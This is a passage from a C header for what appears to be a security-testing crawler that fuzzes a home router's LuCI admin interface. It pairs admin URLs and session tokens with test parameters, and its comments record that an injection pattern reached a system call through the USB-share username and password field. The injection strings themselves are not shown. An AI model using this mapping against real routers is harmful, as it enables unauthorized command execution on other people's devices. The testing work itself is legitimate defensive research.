	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/region?form=region"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/locale?form=country_list"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=region"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/locale?form=country"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_2g"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_5g"},

	/* Setting itself */
	{ 314, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_5g"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=syspara_5g"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: of limited size, does not accept long records */
Sp a5_Params[] = {

	/* A pair of correct values to ensure engine works */
	//{"STRING1_STRING1_STRING1", "STRING2_STRING2_STRING2", NULL, NULL},

	/* PATTERN1 - no success */
	{str3, str4, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}

};

/* Basic. USB-share. Access Address */
Gp a3_URLs[] = {

	/* Tab-2 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/network?form=status_ipv4"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/basic.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/menu?form=basic_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/basic_network.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/wireless?form=region"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/wireless?form=wireless_schedule_wifi_disable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/status?form=internet"},

	/* USB-Sharing. USB-Storage Device */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/status?form=router"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/basic_folder_share.html"},
	{ 0, "http://192.168.0.1/webpages/js/libs/excanvas.js?_=1494328101143"},
	{ 0, "http://192.168.0.1/webpages/js/libs/Chart.js?_=1494328101144"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/disk_setting?form=first"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/disk_setting?form=metadata"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=settings"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=server"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=auth"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=partial"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=guest"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=media"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/disk_setting?form=contents&serial=0320815020006996"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=volumn"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=tree"},

	/* Option itself */
	{315,"http://192.168.0.1/cgi-bin/luci/;stok=46b54bedbf68c7ee613049a38c71db48/admin/folder_sharing?form=settings"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: the size is limited by "0123456789ABCD" */
Sp a3_Params[] = {

	/* A correct value to ensure the engine works */
	{"_2_TEST_TEST", NULL, NULL, NULL},

	/* PATTERN1 - no success */
	{str4, NULL, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}
};

/* Advanced. QoS Settings. Bandwidth */
Gp a10_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* QOS-Setting */
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/wol.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/wol?form=enable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/wol?form=wake_list"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/qosSettings.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/network?form=lan_ipv4"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/qos?form=settings"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/qos?form=applist"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/iptv?form=setting"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/nat?form=setting"},

	/* Two strings themselves */
	{316,"http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/qos?form=settings"}, 

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: limited by "12345678" ; takes digits only */
Sp a10_Params[] = {

	/* A pair of correct values to ensure the engine works */
	{"6", "7", NULL, NULL},

	/* PATTERN1 - no success */
	{str4, NULL, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}
};

/* Advanced. QoS Settings. Rules */
Gp a11_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* QOS-Setting */
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/wol.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/wol?form=enable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/wol?form=wake_list"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/qosSettings.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/network?form=lan_ipv4"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/qos?form=settings"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/qos?form=applist"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/iptv?form=setting"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=67b13a272e03f76283bb827c7d14bc7f/admin/nat?form=setting"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=5249cc24424633ea1b5880afa1ad28ae/admin/qos?form=list"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=5249cc24424633ea1b5880afa1ad28ae/admin/qos?form=list"},

	/* Setting itself */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=6f5dd17d5e1991e2cb1404f4ec83be1b/admin/access_control?form=black_devices"},
	{317,"http://192.168.0.1/cgi-bin/luci/;stok=6f5dd17d5e1991e2cb1404f4ec83be1b/admin/qos?form=add"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: will not take long records */
Sp a11_Params[] = {

	/* A pair of correct values to ensure the engine works */
	{"TO-BE-FI","94-DE-80-5F-B2-ED", NULL, NULL},

	/* PATTERN1 - no success */
	{str4, NULL, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}
};


/* Advanced. System Tools. NTP Server */
Gp a12_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* Time Settings */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/network?form=lan_ipv6"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/network?form=wan_ipv6_status"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/network?form=lan_ipv6"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/timeSettings.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/time?form=hour24"},


	/* Setting itself */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=6f5dd17d5e1991e2cb1404f4ec83be1b/admin/access_control?form=black_devices"},
	{318,"http://192.168.0.1/cgi-bin/luci/;stok=6f5dd17d5e1991e2cb1404f4ec83be1b/admin/qos?form=add"},


	/* Another setting */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/quick_setup?form=timezone"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/time?form=settings"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/time?form=dst"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/network?form=lan_ipv6"},
	{318,"http://192.168.0.1/cgi-bin/luci/;stok=18ca124adb45aaa98211bc21471b9b18/admin/time?form=settings"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention will not take anything wihtout dots. With semicolons will not take */
Sp a12_Params[] = {

	/* A pair of correct values to ensure the engine works */
	{"TESTSRV_A.com", "TESTSRV_B.net", NULL, NULL},

	/* Long, incorrect strings */	//{"TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1TESTSRV1.com", "TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2TESTSRV2.net", NULL, NULL},

	/* PATTERN1 - no success */
	{str3, str4, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}
};


/* Advanced. System Tools. Diagnostics. Ping,Trcrt Domainname */
Gp a13_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* Diagnostics */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/wireless?form=wireless_schedule_wifi_disable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=9b9dda8ae5874d60056215425a564f97/admin/status?form=internet"},

	{ 1, "http://192.168.0.1/webpages/pages/userrpm/diagnostic.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c5878b8c28bd648049bc28e13219d202/admin/diag?form=diag"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c5878b8c28bd648049bc28e13219d202/admin/diag?form=port_mirror"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c5878b8c28bd648049bc28e13219d202/admin/diag?form=port_mirror"},

	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/status?form=internet"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/wireless?form=wireless_schedule_wifi_disable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/status?form=all"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/status?form=internet"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/wireless?form=wireless_schedule_wifi_disable"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/status?form=all"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/diagnostic.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=2528c3f1d01e8ab30dad7c4ba264c028/admin/diag?form=diag"},



	/* Setting itself */
	{319,"http://192.168.0.1/cgi-bin/luci/;stok=c5878b8c28bd648049bc28e13219d202/admin/diag?form=diag"},

	/* End marker */
	{ 0x0, NULL }
};

/* Trans-reboot operation. Attention will not take anything wihtout dots, semicolons, usw */
Sp a13_Params[] = {

	/* A correct value to ensure the engine works */
	{"time_srvC.com", NULL, NULL, NULL},

	/* PATTERN1 - no success */
	{str3, NULL, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}};


/* Advanced. System Tools. Diagnostics. Old,New Passwd */
Gp a14_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* SysTools. Administration */
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/password.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/network?form=lan_ipv4"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/nat?form=vs"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/administration?form=account"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/administration?form=recovery"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/administration?form=mode"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/administration?form=local"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/login?form=check_factory_default"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/administration?form=remote"},

	/* Setting itself */
	{320,"http://192.168.0.1/cgi-bin/luci/;stok=c6b2ac6a8c6a6a35a39207f5ce73c187/admin/administration?form=account"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: correct patameters have to be precisely 100h bytes long */
Sp a14_Params[] = {

	/* A triplet of (in)correct ones to ensure the engine works */
{"6deed0805febddf56c785740fbab47a18abfc1b94a33e7b2d08cdde8de0bfb8053cf311ef1b0e95965f04ba6d4b645b9a2954c31e4b24accb3716140b6242e12deff889a976e279191b02f90aaf22cc9c2ccfc88db71d1a9f51bd211ec728e0024ed72c1b58f5f0b39a49e04951d6b62287cffd5cf90d6800f9785396ac628c5","9a5a1b98c0f5ac6c5dbc4c16eef640b3bd9c7742e1d3b03cf6ca9b281760ea45cf979b18987f7d8ae2de7f905663403d2ba09ce476128ee1cd0b5535fcfe853ce073fbdf5ec3f0ecbd58584a8db254def6dbad53da1297c61bd555fea49642d19a4d5d01fd3791eee4317b76d7ac223c8c26c5daaa42c774d626747e84b2bfd1"
,"4187fed2bf4a5f1f20d9dc5b3c0f015089d5cd0a890c9b4d4d162acf636d9ce04f4bee2010ab95b876778911169639fc6bb4444c119edc08667d19013c6d12dbc2a56f28fc93d3be90677b90e18424ed241a3f818324f440e8ab7d7ac2552bfb0ec7ecaf64e481a3dc55642466a6f928a0689d41ddd4313a94c9306d3e5f4d97",NULL},

	/* Short, i.e. incorrect ones */
	{"1111111111111111111111111111","2222222222222222222222222222","3333333333333333333333333333" , NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}

};


/* Advanced. IPv6. IPv6 Address Prefix */
Gp a15_URLs[] = {

	/* Tab-3 */
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/quick_setup?form=quick_setup"},
	{ 1, "http://192.168.0.1/webpages/pages/frame/advanced.html"},
	{ 0, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/menu?form=advanced_menu"},
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/status.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=f1722c603ee0b66edd836bf1a8aaab3b/admin/wireless?form=region"},

	/* SysTools. IPv6 Adr PFX */
	{ 1, "http://192.168.0.1/webpages/pages/userrpm/ipv6.html"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=status_ipv4"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=lan_ipv6"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=mac_clone_advanced"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=wan_ipv6_protos"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=wan_ipv6_status"},
	{ 1, "http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=lan_ipv6"},

	/* Setting itself */
	{321,"http://192.168.0.1/cgi-bin/luci/;stok=552a05559b02aaba745e7b40c8b65be6/admin/network?form=lan_ipv6"},

	/* End marker */
	{ 0x0, NULL }
};

/* Attention: usually prefix if smth like "2001::", "3001::", etc */
Sp a15_Params[] = {

	/* A correct one to ensure the engine works */
	{"9001", NULL, NULL, NULL},

//	{"LONGSTINGLONGSTINGLONGSTINGLONGSTINGLONGSTINGLONGSTING", NULL, NULL, NULL},

	/* Terminating record */
	{NULL, NULL, NULL, NULL}
};

/* Threedimensional table:
	axis Ox: Name, URLs, Params
	axis Oy: record 1, record 2, .., record 11
	axis 0z: param set1, param set2, ..., param set N]
*/
ThreeDimSpace aTestTable[] =  {

	{ "Advanced. USB-share. Username & password", &a9_URLs, &a9_Params},
};

ThreeDimSpace _aTestTable[] =  {

	/* NOT REPRODUCED: goes into UCICFG.global.svrname, does not go to syscall. */
	{ "Basic. USB-share. Access Address", &a3_URLs, &a3_Params},

	/* NOT REPRODUCED: does not appear on system tray. */
	{ "Advanced. Wireless. 5. GHz", &a5_URLs, &a5_Params},

	/* NOT REPRODUCED: does not appear on system tray */
	{ "Advanced. Wireless. 2.4 GHz", &a6_URLs, &a6_Params},

	/* NOT REPRODUCED: does not appear on system tray */
	{ "Advanced. Wireless. SessionID1 , SessionID2", &a7_Array, &a7_Params},

	/* NOT REPRODUCED: seems to accepts digits only */
	{ "Advanced. QoS Settings. Bandwidth", &a10_URLs, &a10_Params},

	/* NOT REPRODUCED: does not result in the sys.call, results in uci:commit */
	{ "Advanced. QoS Settings. Rules", &a11_URLs, &a11_Params},

	/* NOT REPRODUCED: none of 2 parameters affects the TIME_SYSTEMS_SCHELL anyhow */
	{ "Advanced. System Tools. NTP Server", &a12_URLs, &a12_Params},

	/* NOT REPRODUCED: does not result in the direct sys.call */
	{ "Advanced. System Tools. Diagnostics. Ping,Trcrt Domainname", &a13_URLs, &a13_Params},

	/* NOT REPRODUCED: strict format requirements, could not transform any of hashes into smth malicious. */
	{ "Advanced. System Tools. Diagnostics. Old,New Passwd", &a14_URLs, &a14_Params},

	/* NOT REPRODUCED: strict format requirements, could not transform "x0001::" into smth malicious. */
	{ "Advanced. IPv6. IPv6 Address Prefix", &a15_URLs, &a15_Params},

	/* REPRODUCED: pattern1 */
	{ "Advanced. USB-share. Username & password", &a9_URLs, &a9_Params},

};

#endif /* !defined(_SITE_CRAWLER_H_) */
